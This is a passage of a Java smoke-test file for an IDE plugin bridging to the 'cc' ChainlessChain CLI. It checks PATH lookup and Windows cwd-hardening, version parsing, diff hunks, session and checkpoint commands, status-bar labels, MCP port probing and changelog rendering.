        evW2.put("type", "iteration_warning"); // no message → default text
        java.util.Map<String, Object> warn2 = ChatEvents.mapAgentEvent(evW2, st);
        check(warn2 != null && String.valueOf(warn2.get("text")).startsWith("⚠ approaching"),
                "iteration_warning default message");
    }

    private static void cliLauncher() {
        System.out.println("CliLauncher (PATH augmentation — makes cc reachable from the IDE):");
        // Windows: the npm default global prefix (%APPDATA%\npm) is offered — the
        // exact dir whose absence triggers "'cc' is not recognized".
        java.util.Map<String, String> win = new java.util.HashMap<String, String>();
        win.put("APPDATA", "C:\\Users\\u\\AppData\\Roaming");
        win.put("ProgramFiles", "C:\\Program Files");
        java.util.List<String> wd = CliLauncher.candidateBinDirs(win, true);
        check(wd.contains("C:\\Users\\u\\AppData\\Roaming\\npm"), "win: %APPDATA%\\npm offered");
        check(wd.contains("C:\\Program Files\\nodejs"), "win: ProgramFiles\\nodejs offered");
        // posix: homebrew + npm-global covered
        java.util.Map<String, String> nix = new java.util.HashMap<String, String>();
        nix.put("HOME", "/home/u");
        java.util.List<String> nd = CliLauncher.candidateBinDirs(nix, false);
        check(nd.contains("/usr/local/bin") && nd.contains("/opt/homebrew/bin"), "posix: brew dirs offered");
        check(nd.contains("/home/u/.npm-global/bin"), "posix: ~/.npm-global/bin offered");
        // node version managers take precedence (active node's bin)
        java.util.Map<String, String> nvm = new java.util.HashMap<String, String>();
        nvm.put("HOME", "/home/u");
        nvm.put("NVM_BIN", "/home/u/.nvm/versions/node/v22.0.0/bin");
        check(CliLauncher.candidateBinDirs(nvm, false).get(0).equals("/home/u/.nvm/versions/node/v22.0.0/bin"),
                "posix: NVM_BIN listed first");
        // augmentedPath appends missing dirs, dedups, preserves existing order
        eq(CliLauncher.augmentedPath("/usr/bin", java.util.Arrays.asList("/opt/x", "/usr/bin"), ':'),
                "/usr/bin:/opt/x", "append new dir, drop duplicate, keep order");
        eq(CliLauncher.augmentedPath(null, java.util.Arrays.asList("/a", "/b"), ':'),
                "/a:/b", "null PATH → just the candidates");
        // missing-cli detection across the OS-specific shell messages
        check(CliLauncher.looksLikeMissingCli("'cc' is not recognized as an internal or external command"),
                "win 'not recognized' → missing");
        check(CliLauncher.looksLikeMissingCli("/bin/sh: cc: command not found"), "posix 'command not found' → missing");
        check(CliLauncher.looksLikeMissingCli("Cannot run program \"cc\": error=2, No such file or directory"),
                "java CreateProcess error=2 → missing");
        check(!CliLauncher.looksLikeMissingCli("llm.provider = volcengine"), "normal output → not missing");
        check(!CliLauncher.looksLikeMissingCli(null), "null → not missing");
        check(CliLauncher.missingCliMessage().contains("npm i -g chainlesschain"), "guidance names the install command");
        check(CliLauncher.missingCliMessage().contains("22.12.0"), "guidance names the Node.js floor");
        // Security: augmentPath hardens the child env against cwd-first cmd.exe
        // resolution (a repo-local cc.bat would otherwise run). The flag is
        // Windows-only; on POSIX there's no cmd.exe current-dir lookup to disable.
        ProcessBuilder pb = new ProcessBuilder("cc", "--version");
        CliLauncher.augmentPath(pb);
        if (java.io.File.separatorChar == '\\') {
            eq(pb.environment().get("NoDefaultCurrentDirectoryInExePath"), "1",
                    "win: augmentPath sets NoDefaultCurrentDirectoryInExePath");
        } else {
            check(pb.environment().get("NoDefaultCurrentDirectoryInExePath") == null,
                    "posix: no cwd-first hardening flag needed");
        }
    }

    private static void cliVersionCheck() {
        System.out.println("CliVersionCheck:");
        eq(CliVersionCheck.parseVersion("chainlesschain 0.162.80\n"), "0.162.80",
                "parse from cc --version output");
        check(CliVersionCheck.parseVersion("no version here") == null, "junk -> null");
        check(CliVersionCheck.compare("0.162.80", "0.162.93") < 0, "older < newer");
        check(CliVersionCheck.compare("0.162.93", "0.162.93") == 0, "equal");
        check(CliVersionCheck.compare("0.163.0", "0.162.99") > 0, "newer > older");
        eq(CliVersionCheck.parseNpmLatest("{\"name\":\"chainlesschain\",\"version\":\"0.162.93\"}"),
                "0.162.93", "parseNpmLatest pulls version");
        check(CliVersionCheck.parseNpmLatest("{}") == null, "no version field -> null");
        String notice = CliVersionCheck.updateNotice("0.162.80", "0.162.93");
        check(notice != null && notice.contains("0.162.93"), "trails latest -> notice mentions latest");
        check(CliVersionCheck.updateNotice("0.162.93", "0.162.93") == null, "up to date -> null");
        check(CliVersionCheck.updateNotice("0.163.0", "0.162.93") == null, "ahead -> null");
        check(CliVersionCheck.updateNotice(null, "0.162.93") == null, "unknown installed -> null");
        check(CliVersionCheck.updateNotice("0.162.80", null) == null, "no npm latest -> null");
    }

    private static void fixWithCc() {
        System.out.println("FixWithCc:");
        FixWithCc.Diag e = new FixWithCc.Diag(12, "Error", "Cannot find symbol foo", "javac", "compiler.err");
        eq(FixWithCc.formatDiagnosticLine(e),
                "- [Error] line 13: Cannot find symbol foo (javac compiler.err)",
                "diagnostic line (0→1-based, source+code)");
        // whitespace collapse in message
        FixWithCc.Diag w = new FixWithCc.Diag(0, "Warning", "unused\n   import", null, null);
        eq(FixWithCc.formatDiagnosticLine(w), "- [Warning] line 1: unused import",
                "message whitespace collapsed");
        // full prompt: @file reference + bullets
        java.util.List<FixWithCc.Diag> ds = java.util.Arrays.asList(e, w);
        String prompt = FixWithCc.formatFixPrompt("src\\Main.java", ds);
        check(prompt.startsWith("Fix the following problems in @src/Main.java"),
                "prompt: @-ref with forward slashes + plural");
        check(prompt.contains("line 13") && prompt.contains("line 1"),
                "prompt lists both problems");
        check(prompt.endsWith("\n"), "prompt ends with newline");
        // singular noun + no path → "this file"
        String one = FixWithCc.formatFixPrompt("", java.util.Arrays.asList(e));
        check(one.startsWith("Fix the following problem in this file"),
                "singular + no path → this file");
        // empty → ""
        eq(FixWithCc.formatFixPrompt("x", new java.util.ArrayList<FixWithCc.Diag>()), "",
                "no diagnostics → empty prompt");
        // title
        eq(FixWithCc.buildFixActionTitle(3), "Fix 3 problems with ChainlessChain", "counted title");
        eq(FixWithCc.buildFixActionTitle(1), "Fix with ChainlessChain", "singular title");
    }

    private static void markdownLite() {
        System.out.println("MarkdownLite:");
        // plain text → single TEXT span
        eq(MarkdownLite.parse("hello world"),
                java.util.Arrays.asList(new MarkdownLite.Span(MarkdownLite.Kind.TEXT, "hello world")),
                "plain → one TEXT span");
        // inline code
        eq(MarkdownLite.parse("run `npm test` now"),
                java.util.Arrays.asList(
                        new MarkdownLite.Span(MarkdownLite.Kind.TEXT, "run "),
                        new MarkdownLite.Span(MarkdownLite.Kind.CODE, "npm test"),
                        new MarkdownLite.Span(MarkdownLite.Kind.TEXT, " now")),
                "inline `code`");
        // bold
        eq(MarkdownLite.parse("a **bold** b"),
                java.util.Arrays.asList(
                        new MarkdownLite.Span(MarkdownLite.Kind.TEXT, "a "),
                        new MarkdownLite.Span(MarkdownLite.Kind.BOLD, "bold"),
                        new MarkdownLite.Span(MarkdownLite.Kind.TEXT, " b")),
                "**bold**");
        // fenced code with a language tag (tag line dropped)
        java.util.List<MarkdownLite.Span> fenced =
                MarkdownLite.parse("see:\n```java\nint x = 1;\n```\ndone");
        check(fenced.size() == 3, "fenced → TEXT + CODE + TEXT");
        eq(fenced.get(1).kind, MarkdownLite.Kind.CODE, "middle span is CODE");
        eq(fenced.get(1).text, "int x = 1;\n", "code body keeps newline, drops lang tag");
        // unclosed markers degrade to plain (never lose chars)
        eq(MarkdownLite.parse("a `b c"),
                java.util.Arrays.asList(new MarkdownLite.Span(MarkdownLite.Kind.TEXT, "a `b c")),
                "unclosed backtick → plain");
        eq(MarkdownLite.parse("x **y"),
                java.util.Arrays.asList(new MarkdownLite.Span(MarkdownLite.Kind.TEXT, "x **y")),
                "unclosed bold → plain");
        // round-trip: concatenated span texts == input minus markers
        String md = "use `f()` and **g** in ```py\ncode\n```";
        StringBuilder rebuilt = new StringBuilder();
        for (MarkdownLite.Span s : MarkdownLite.parse(md)) rebuilt.append(s.text);
        eq(rebuilt.toString(), "use f() and g in code\n", "spans lose only the markers");
        // empty / null
        check(MarkdownLite.parse("").isEmpty(), "empty → no spans");
        check(MarkdownLite.parse(null).isEmpty(), "null → no spans");
    }

    private static void lockfilePrune() {
        System.out.println("LockfileWriter.pruneStale:");
        java.nio.file.Path tmp = null;
        try {
            tmp = java.nio.file.Files.createTempDirectory("ide-prune-");
            // Only pid 100 is "alive"; 200 is dead.
            LockfileWriter w = new LockfileWriter(tmp, pid -> pid == 100L);
            w.write(1, "t", java.util.Collections.singletonList("/ws"), "http://x", 0L, 100L);
            w.write(2, "t", java.util.Collections.singletonList("/ws"), "http://x", 0L, 200L);
            java.nio.file.Files.write(tmp.resolve("3.json"),
                    "{ not json".getBytes(java.nio.charset.StandardCharsets.UTF_8));
            java.nio.file.Files.write(tmp.resolve("4.json"),
                    "{\"port\":4}".getBytes(java.nio.charset.StandardCharsets.UTF_8)); // no pid

            eq(w.pruneStale(), 3, "removes dead + corrupt + pidless");
            check(java.nio.file.Files.exists(tmp.resolve("1.json")), "alive (pid 100) kept");
            check(!java.nio.file.Files.exists(tmp.resolve("2.json")), "dead (pid 200) removed");
            check(!java.nio.file.Files.exists(tmp.resolve("3.json")), "corrupt removed");
            check(!java.nio.file.Files.exists(tmp.resolve("4.json")), "pidless removed");

            // Absent dir → 0.
            eq(new LockfileWriter(tmp.resolve("nope"), pid -> true).pruneStale(), 0, "absent dir → 0");
        } catch (Exception e) {
            check(false, "pruneStale smoke threw: " + e);
        } finally {
            if (tmp != null) {
                try (java.util.stream.Stream<java.nio.file.Path> s = java.nio.file.Files.walk(tmp)) {
                    s.sorted(java.util.Comparator.reverseOrder()).forEach(p -> {
                        try { java.nio.file.Files.deleteIfExists(p); } catch (Exception ignore) { }
                    });
                } catch (Exception ignore) { }
            }
        }
    }

    private static void transcriptCap() {
        System.out.println("TranscriptCap:");
        final int CAP = 100;
        // Within / at the cap → nothing removed.
        check(TranscriptCap.removeCount(50, -1, false, CAP) == 0, "under cap → 0");
        check(TranscriptCap.removeCount(100, -1, false, CAP) == 0, "exactly cap → 0");
        check(TranscriptCap.removeCount(0, -1, false, CAP) == 0, "empty doc → 0");
        // Over cap, no active run → trim exactly the overflow from the front.
        check(TranscriptCap.removeCount(150, -1, false, CAP) == 50, "over cap, no run → excess");
        // Over cap during a run → never trim past the run start.
        check(TranscriptCap.removeCount(150, 30, true, CAP) == 30, "run at 30 → capped at runStart");
        check(TranscriptCap.removeCount(150, 80, true, CAP) == 50, "run at 80 → full excess (< runStart)");
        check(TranscriptCap.removeCount(150, 0, true, CAP) == 0, "run at 0 → nothing removable");
        check(TranscriptCap.removeCount(150, 30, true, CAP) <= 30, "removeLen ≤ runStart while in run");
        // A stale runStart with inRun=false is ignored (whole prefix is free).
        check(TranscriptCap.removeCount(150, 30, false, CAP) == 50, "not in run → ignore runStart");
        // Degenerate caps.
        check(TranscriptCap.removeCount(10, -1, false, 0) == 10, "cap 0 → remove all");
        check(TranscriptCap.removeCount(10, -1, false, -5) == 10, "negative cap → treated as 0");
        // The default cap is positive and generous.
        check(TranscriptCap.DEFAULT_MAX_CHARS > 0, "default cap > 0");
        check(TranscriptCap.removeCount(TranscriptCap.DEFAULT_MAX_CHARS, -1, false,
                TranscriptCap.DEFAULT_MAX_CHARS) == 0, "exactly default cap → 0");
    }

    private static void diffHunks() {
        System.out.println("DiffHunks (hunk-level partial accept)");

        String original = "a\nb\nc\nd\ne\nf";
        String modified = "a\nB\nc\nd\nE1\nE2\nf"; // change b→B; change e→E1+E2
        List<DiffHunks.Hunk> hunks = DiffHunks.computeHunks(original, modified);
        eq(hunks.size(), 2, "two separated changes -> two hunks");
        // Core invariants: all selected == modified; none selected == original.
        java.util.Set<Integer> all = new java.util.HashSet<>(Arrays.asList(0, 1));
        eq(DiffHunks.applyHunks(original, hunks, all), modified, "apply all == modified");
        eq(DiffHunks.applyHunks(original, hunks, new java.util.HashSet<>()),
                original, "apply none == original");
        // Partial: only the first hunk applied keeps e→f intact.
        eq(DiffHunks.applyHunks(original, hunks, new java.util.HashSet<>(Arrays.asList(0))),
                "a\nB\nc\nd\ne\nf", "apply hunk 0 only");
        eq(DiffHunks.applyHunks(original, hunks, new java.util.HashSet<>(Arrays.asList(1))),
                "a\nb\nc\nd\nE1\nE2\nf", "apply hunk 1 only");
        // Header shape ("lines <a>-<b> (-x +y)").
        check(hunks.get(0).header.startsWith("lines 2-2 (-1 +1)"), "hunk 0 header");
        check(hunks.get(1).header.startsWith("lines 5-5 (-1 +2)"), "hunk 1 header");
        check(!hunks.get(0).preview.isEmpty(), "hunk preview non-empty");

        // Pure insertion (no old lines) — header uses the "<line>+" form.
        List<DiffHunks.Hunk> ins = DiffHunks.computeHunks("a\nb", "a\nX\nb");
        eq(ins.size(), 1, "pure insertion -> one hunk");
        check(ins.get(0).header.contains("1+"), "insertion header <line>+");
        eq(DiffHunks.applyHunks("a\nb", ins, new java.util.HashSet<>(Arrays.asList(0))),
                "a\nX\nb", "insertion applies");

        // Pure deletion — preview falls back to the removed line.
        List<DiffHunks.Hunk> del = DiffHunks.computeHunks("a\nb\nc", "a\nc");
        eq(del.size(), 1, "pure deletion -> one hunk");
        check(del.get(0).preview.startsWith("-"), "deletion preview shows removed line");
        eq(DiffHunks.applyHunks("a\nb\nc", del, new java.util.HashSet<>()),
                "a\nb\nc", "deletion unselected -> original");

        // Identical inputs and null tolerance.
        check(DiffHunks.computeHunks("same", "same").isEmpty(), "identical -> no hunks");
        check(DiffHunks.computeHunks(null, null).isEmpty(), "null/null -> no hunks");
        eq(DiffHunks.applyHunks("x", new ArrayList<>(), new java.util.HashSet<>()),
                "x", "no hunks -> original");
    }

    private static void reviewNote() {
        System.out.println("ReviewNote (request-changes line-anchor prefix)");

        String text = "alpha\nbeta\ngamma";
        eq(ReviewNote.parse(null, text), null, "null input ends loop");
        eq(ReviewNote.parse("  ", text), null, "blank input ends loop");

        Map<String, Object> plain = ReviewNote.parse("tighten this up", text);
        eq(plain.get("note"), "tighten this up", "plain note text");
        check(!plain.containsKey("line"), "plain note has no anchor");

        Map<String, Object> one = ReviewNote.parse("2: rename it", text);
        eq(one.get("line"), 1, "1-based prefix -> 0-based line");
        eq(one.get("endLine"), 1, "single anchor endLine == line");
        eq(one.get("lineText"), "beta", "lineText from reviewed text");
        eq(one.get("note"), "rename it", "anchored note strips prefix");

        Map<String, Object> range = ReviewNote.parse("1-3: extract helper", text);
        eq(range.get("line"), 0, "range start");
        eq(range.get("endLine"), 2, "range end");

        Map<String, Object> clamp = ReviewNote.parse("2-99: tail", text);
        eq(clamp.get("endLine"), 2, "end clamps to last line");

        Map<String, Object> stale = ReviewNote.parse("99: stale", text);
        check(!stale.containsKey("line"), "out-of-range start -> general note");
        eq(stale.get("note"), "99: stale", "out-of-range keeps full text");

        Map<String, Object> cjk = ReviewNote.parse("3：全角冒号", text);
        eq(cjk.get("line"), 2, "full-width colon anchors");
    }

    private static void rewindCommands() {
        System.out.println("RewindCommands (/rewind checkpoint args + parsers)");

        eq(String.join(" ", RewindCommands.buildListArgs("s1")),
                "checkpoint list -s s1 --json", "list args");
        eq(String.join(" ", RewindCommands.buildListArgs(null)),
                "checkpoint list -s default --json", "list args default session");
        eq(String.join(" ", RewindCommands.buildRestoreArgs("s1", "cp-3")),
                "checkpoint restore cp-3 -s s1 --force --json", "restore args");

        List<RewindCommands.Checkpoint> cps = RewindCommands.parseCheckpointList(
                "[{\"id\":\"cp-2\",\"createdAt\":\"2026-07-05\",\"label\":\"before edit\",\"fileCount\":3},"
                + "{\"id\":\"cp-1\"},{\"label\":\"no id -> dropped\"}]");
        eq(cps.size(), 2, "rows without id dropped");
        eq(cps.get(0).id, "cp-2", "first checkpoint id");
        check(RewindCommands.itemLabel(cps.get(0)).contains("3 file(s)"), "label has file count");
        check(RewindCommands.itemLabel(cps.get(1)).equals("cp-1"), "bare label = id only");
        check(RewindCommands.parseCheckpointList("not json").isEmpty(), "bad json -> empty");
        check(RewindCommands.parseCheckpointList("{\"a\":1}").isEmpty(), "non-array -> empty");

        check(RewindCommands.restoreOk("{\"restoredCount\":2}"), "restore ok on json object");
        check(!RewindCommands.restoreOk("boom"), "restore not ok on garbage");
        eq(RewindCommands.restoredCount("{\"restoredCount\":2}"), 2, "restoredCount field");
        eq(RewindCommands.restoredCount("{\"restored\":5}"), 5, "restored fallback field");
        check(RewindCommands.restoredCount("{\"ok\":true}") == null, "missing count -> null");

        // Diff preview (show --diff) — args + both payload shapes.
        eq(String.join(" ", RewindCommands.buildShowDiffArgs("s1", "cp-3")),
                "checkpoint show cp-3 --diff -s s1 --json", "show --diff args");
        eq(RewindCommands.formatDiffPreview("{\"id\":\"cp-3\",\"diff\":\"--- a\\n+++ b\\n\"}"),
                "--- a\n+++ b", "raw patch trimmed");
        String status = RewindCommands.formatDiffPreview(
                "{\"modified\":[{\"rel\":\"a.js\"}],\"added\":[\"b.js\"],\"deleted\":[]}");
        check(status.contains("modified (1):") && status.contains("a.js"), "status modified");
        check(status.contains("added (1):") && status.contains("b.js"), "status added");
        check(!status.contains("deleted"), "empty section dropped");
        eq(RewindCommands.formatDiffPreview("{}"), "", "no diff/status -> empty");
        eq(RewindCommands.formatDiffPreview("not json"), "", "bad json -> empty");
    }

    private static void sessionList() {
        System.out.println("SessionList (/sessions args + parser)");

        eq(String.join(" ", SessionList.buildListArgs(30)),
                "session list --json -n 30", "list args");

        List<SessionList.SessionItem> items = SessionList.parseSessionList(
                "[{\"id\":\"s-agent\",\"title\":\"fix bug\",\"updated_at\":\"2026-07-05\",\"_store\":\"jsonl\"},"
                + "{\"id\":\"s-chat\",\"updatedAt\":\"2026-07-04\"},"
                + "{\"title\":\"no id -> dropped\"},{\"id\":\"\"}]");
        eq(items.size(), 2, "rows without id dropped");
        eq(items.get(0).store, "agent", "_store jsonl -> agent");
        eq(items.get(1).store, "chat", "no _store -> chat");
        eq(items.get(0).updatedAt, "2026-07-05", "updated_at snake_case");
        eq(items.get(1).updatedAt, "2026-07-04", "updatedAt camelCase fallback");
        check(SessionList.itemLabel(items.get(0)).contains("fix bug"), "label has title");
        check(SessionList.itemLabel(items.get(1)).startsWith("s-chat  ·  chat"), "label id+store");
        check(SessionList.parseSessionList("nope").isEmpty(), "bad json -> empty");
        check(SessionList.parseSessionList("{}").isEmpty(), "non-array -> empty");
    }

    private static void imageAttachments() {
        System.out.println("ImageAttachments (drag-drop filter + cap)");

        check(ImageAttachments.isImagePath("a/shot.PNG"), "png case-insensitive");
        check(ImageAttachments.isImagePath("b.webp"), "webp accepted");
        check(!ImageAttachments.isImagePath("notes.txt"), "txt rejected");
        check(!ImageAttachments.isImagePath(null), "null rejected");

        List<String> dropped = Arrays.asList("a.png", "doc.pdf", "b.jpg", "c.gif", "d.bmp", "e.png");
        eq(ImageAttachments.acceptDropped(dropped, 0).size(), 4, "cap at 4 from empty");
        eq(ImageAttachments.acceptDropped(dropped, 0).get(0), "a.png", "order preserved");
        eq(ImageAttachments.acceptDropped(dropped, 3).size(), 1, "3 attached -> room for 1");
        check(ImageAttachments.acceptDropped(dropped, 4).isEmpty(), "cap reached -> none");
        check(ImageAttachments.acceptDropped(null, 0).isEmpty(), "null list -> none");
        check(ImageAttachments.acceptDropped(Arrays.asList("x.txt"), 0).isEmpty(),
                "non-images filtered out");
    }

    private static void projectMemory() {
        System.out.println("ProjectMemory (init / memory files args)");

        eq(String.join(" ", ProjectMemory.buildInitArgs(false, false)), "init", "plain init");
        eq(String.join(" ", ProjectMemory.buildInitArgs(true, false)), "init --ai", "init --ai");
        eq(String.join(" ", ProjectMemory.buildInitArgs(true, true)),
                "init --ai --force", "init --ai --force");
        eq(String.join(" ", ProjectMemory.buildMemoryFilesArgs()), "memory files", "memory files");
        eq(ProjectMemory.initModes().size(), 2, "two init modes");
        check(ProjectMemory.initModes().get(1)[0].contains("--ai"), "second mode is --ai");
        eq(ProjectMemory.leanContextEnvValue(true), "lean", "lean context env = lean when on");
        check(ProjectMemory.leanContextEnvValue(false) == null, "lean context env = null when off");
    }

    private static void statusBarText() {
        System.out.println("StatusBarText (status-bar widget label/tooltip)");

        // Label: running + the three approval modes; stopped state.
        eq(StatusBarText.label(63412, "default"), "CC :63412", "running default label");
        eq(StatusBarText.label(63412, "acceptEdits"), "CC :63412 ✓auto", "auto label");
        eq(StatusBarText.label(63412, "bypassPermissions"), "CC :63412 ⚠bypass", "bypass label");
        eq(StatusBarText.label(-1, "default"), "CC off", "stopped label");
        eq(StatusBarText.label(0, "default"), "CC off", "port 0 = stopped");
        // A bridge-down widget still surfaces an elevated mode.
        eq(StatusBarText.label(-1, "bypassPermissions"), "CC off ⚠bypass", "stopped + bypass label");

        // Mode suffix: quiet for default AND for unknown/null (forward-compat).
        eq(StatusBarText.modeSuffix("default"), "", "default = quiet");
        eq(StatusBarText.modeSuffix(null), "", "null mode = quiet");
        eq(StatusBarText.modeSuffix("plan"), "", "unknown mode = quiet");

        // Tooltip: endpoint + mode line + click hint, in that order.
        String tip = StatusBarText.tooltip(63412, "bypassPermissions");
        check(tip.contains("127.0.0.1:63412"), "tooltip has endpoint");
        check(tip.contains("BYPASSED"), "tooltip flags bypass loudly");
        check(tip.contains("/normal"), "tooltip says how to restore");
        check(tip.endsWith("Click for bridge status"), "tooltip click hint last");
        String tipOff = StatusBarText.tooltip(-1, "default");
        check(tipOff.contains("stopped"), "stopped tooltip says stopped");
        check(tipOff.contains("confirm each step"), "default tooltip describes normal mode");
    }

    private static void jetbrainsMcpProbe() {
        System.out.println("JetbrainsMcpProbe:");
        List<String> c = JetbrainsMcpProbe.candidateUrls();
        // Native MCP range (64342…) is tried before the built-in range (63342…).
        check(c.get(0).equals("http://127.0.0.1:64342/stream"), "first = 64342/stream");
        int i64 = c.indexOf("http://127.0.0.1:64342/stream");
        int i63 = c.indexOf("http://127.0.0.1:63342/stream");
        check(i64 >= 0 && i63 >= 0 && i64 < i63, "native 64342 before builtin 63342");
        // /stream before /sse for the same port.
        check(c.indexOf("http://127.0.0.1:64342/stream")
                < c.indexOf("http://127.0.0.1:64342/sse"), "/stream before /sse");
        check(c.contains("http://127.0.0.1:64342/mcp"), "/mcp path included");
        check(c.size() == new HashSet<>(c).size(), "no duplicate candidates");
        // 11 ports × 2 ranges × 3 paths = 66.
        check(c.size() == 66, "66 candidates (11+11 ports × 3 paths)");
        // A pinned URL is tried first and never duplicated.
        List<String> p = JetbrainsMcpProbe.candidateUrls("http://127.0.0.1:64342/stream");
        check(p.get(0).equals("http://127.0.0.1:64342/stream"), "pinned url first");
        check(p.size() == 66, "pinned dups collapse (already a candidate)");
        List<String> p2 = JetbrainsMcpProbe.candidateUrls("http://127.0.0.1:9999/custom");
        check(p2.get(0).equals("http://127.0.0.1:9999/custom"), "novel pinned url first");
        check(p2.size() == 67, "novel pinned url adds one");

        // looksLikeMcpResponse: 2xx + handshake marker accepted; others rejected.
        check(JetbrainsMcpProbe.looksLikeMcpResponse(200,
                "{\"jsonrpc\":\"2.0\",\"id\":1,\"result\":{\"protocolVersion\":\"2024-11-05\"}}"),
                "200 + jsonrpc result accepted");
        check(JetbrainsMcpProbe.looksLikeMcpResponse(200,
                "event: message\ndata: {\"jsonrpc\":\"2.0\",\"result\":{\"serverInfo\":{}}}\n"),
                "200 + SSE data line accepted");
        check(!JetbrainsMcpProbe.looksLikeMcpResponse(404, "Not Found"), "404 rejected");
        check(!JetbrainsMcpProbe.looksLikeMcpResponse(200, "<html>hi</html>"), "200 non-MCP body rejected");
        check(!JetbrainsMcpProbe.looksLikeMcpResponse(500,
                "{\"jsonrpc\":\"2.0\"}"), "5xx rejected even with marker");
        check(!JetbrainsMcpProbe.looksLikeMcpResponse(200, null), "null body rejected");

        // selectLiveUrl: first live candidate wins; a throwing probe is skipped.
        List<String> cand = java.util.Arrays.asList("a", "b", "c");
        eq(JetbrainsMcpProbe.selectLiveUrl(cand, u -> u.equals("b")), "b", "first live wins");
        eq(JetbrainsMcpProbe.selectLiveUrl(cand, u -> false), null, "none live → null");
        eq(JetbrainsMcpProbe.selectLiveUrl(cand, u -> {
            if (u.equals("a")) throw new RuntimeException("boom");
            return u.equals("c");
        }), "c", "throwing probe skipped, scan continues");
        eq(JetbrainsMcpProbe.selectLiveUrl(null, u -> true), null, "null candidates → null");
        eq(JetbrainsMcpProbe.selectLiveUrl(cand, null), null, "null prober → null");
    }

    private static void whatsNew() {
        System.out.println("WhatsNew (cc changelog --json args + parser + renderer)");
        // args
        eq(String.join(" ", WhatsNew.buildChangelogArgs(5)),
                "changelog -n 5 --json", "changelog args");
        eq(String.join(" ", WhatsNew.buildChangelogArgs(0)),
                "changelog -n 5 --json", "non-positive limit -> default 5");
        // version gate (raw --version output ok, prerelease/garbage tolerated)
        check(WhatsNew.supportsChangelog("0.162.151"), "min version supported");
        check(WhatsNew.supportsChangelog("cc 0.163.0\n"), "newer + banner supported");
        check(!WhatsNew.supportsChangelog("0.162.150"), "older rejected");
        check(WhatsNew.supportsChangelog("cc (GCC) 12.2.0"),
                "any found semver >= min passes — a gcc shadow then degrades via empty parse");
        check(!WhatsNew.supportsChangelog(null), "null rejected");
        check(!WhatsNew.supportsChangelog("not a version"), "no semver rejected");
        // parser
        List<WhatsNew.Release> rels = WhatsNew.parseChangelogJson(
                "{\"releases\":[{\"cliVersion\":\"0.162.152\",\"productVersion\":\"v5.0.3.134\","
                + "\"date\":\"2026-07-07\",\"title\":\"audit batch\","
                + "\"sections\":[{\"heading\":\"CLI\",\"body\":\"> fixed things\"}]},"
                + "{\"cliVersion\":\"0.162.151\"},"
                + "{\"noCliVersion\":true}]}");
        eq(rels.size(), 2, "2 valid releases (row without cliVersion dropped)");
        eq(rels.get(0).cliVersion, "0.162.152", "cliVersion");
        eq(rels.get(0).productVersion, "v5.0.3.134", "productVersion");
        eq(rels.get(0).sections.size(), 1, "sections parsed");
        eq(rels.get(0).sections.get(0)[0], "CLI", "section heading");
        check(rels.get(1).sections.isEmpty(), "missing sections -> empty list");
        check(WhatsNew.parseChangelogJson("not json").isEmpty(), "bad json -> empty");
        check(WhatsNew.parseChangelogJson("{\"releases\":\"x\"}").isEmpty(),
                "non-array releases -> empty");
        check(WhatsNew.parseChangelogJson(null).isEmpty(), "null -> empty");
        // renderer
        String text = WhatsNew.changelogToText(rels, "0.162.151");
        check(text.startsWith("# cc CLI — What's New"), "doc title");
        check(text.contains("## 0.162.152 (product v5.0.3.134, 2026-07-07)"),
                "release heading with meta");
        check(text.contains("## 0.162.151 ← installed"), "installed marker");
        check(text.contains("### CLI"), "section heading rendered");
        check(text.contains("fixed things") && !text.contains("> fixed things"),
                "blockquote markers stripped");
        check(!WhatsNew.changelogToText(null, null).isEmpty(), "null releases -> header only");
    }

    private static void ideDoctor() {
        System.out.println("IdeDoctor (Diagnose Bridge args + report)");
        eq(String.join(" ", IdeDoctor.buildStatusArgs()), "ide status", "status args");
        eq(String.join(" ", IdeDoctor.buildDoctorArgs()), "ide doctor", "doctor args");
        eq(String.join(" ", IdeDoctor.buildJetbrainsArgs()), "ide jetbrains", "jetbrains args");
        String up = IdeDoctor.formatReport(51234,
                "connect intellij:51234", "reason: workspace-match",
                "endpoint injected: yes",
                RuntimeCompatibility.evaluate(
                        "0.162.176",
                        RuntimeCompatibility.MIN_CLI_VERSION,
                        51234,
                        null),
                "0.4.68",
                "2024.3");
        check(up.contains("running on 127.0.0.1:51234"), "port shown when up");
        check(up.contains("connect intellij:51234"), "status passthrough");
        check(up.contains("reason: workspace-match"), "doctor passthrough");
        check(up.contains("endpoint injected: yes"), "jetbrains passthrough");
        check(up.contains("READY (可运行)"), "single ready verdict");
        String down = IdeDoctor.formatReport(
                -1, "", null, "  ",
                RuntimeCompatibility.evaluate(
                        "",
                        RuntimeCompatibility.MIN_CLI_VERSION,
                        -1,
                        null),
                "0.4.68",
                "2024.3");
        check(down.contains("STOPPED"), "stopped when port <= 0");
        check(down.contains("Restart Bridge"), "recovery action named");
        check(down.contains("NEEDS REPAIR (需要修复)"),
                "single repair verdict");
        int placeholders = down.split("no output — is the cc CLI installed", -1).length - 1;
        eq(placeholders, 3, "3 empty sections -> 3 visible placeholders");
    }

    private static void ideContextV2() {
        System.out.println("IdeContextV2 (versioned context metadata)");
        Map<String, Object> context = IdeContextV2.build(
                java.util.Arrays.asList(
                        "C:\\repo\\lib", "C:\\repo\\app\\"),
                "file:///C:/repo/app/src/a.ts",
                Long.valueOf(7),
                Boolean.TRUE,
                "workspace-trust:trusted",
                "live-buffer",
                0);
        eq(context.get("schema"), "cc-ide-context/v2", "context schema");
        eq(context.get("workspaceId"), "ws-c206a8c607b55e19",
                "workspace digest");
        check(!String.valueOf(context.get("workspaceId")).contains("repo"),
                "workspace path not exposed");
        Map<?, ?> freshness = (Map<?, ?>) context.get("freshness");
        eq(freshness.get("capturedAt"),
                "1970-01-01T00:00:00.000Z", "capture timestamp");
    }

    private static void backgroundAgents() {
        System.out.println("BackgroundAgents (cc agent --bg state list + display correction)");
        try {
            java.nio.file.Path dir = java.nio.file.Files.createTempDirectory("cc-bg-smoke-");
            long now = 2_000_000L;
            java.nio.file.Files.writeString(dir.resolve("bg-old.json"),
                    "{\"id\":\"bg-old\",\"status\":\"completed\",\"startedAt\":100,"
                    + "\"endedAt\":200,\"exitCode\":0,\"sessionId\":\"s1\"}");
            java.nio.file.Files.writeString(dir.resolve("bg-new.json"),
                    "{\"id\":\"bg-new\",\"status\":\"running\",\"startedAt\":1500000,"
                    + "\"heartbeatAt\":1999000,\"phase\":\"idle\",\"turnCount\":2,"
                    + "\"title\":\"work\",\"transport\":{\"pipe\":\"p\",\"token\":\"t\"}}");
            java.nio.file.Files.writeString(dir.resolve("bg-stale.json"),
                    "{\"id\":\"bg-stale\",\"status\":\"running\",\"startedAt\":1,"
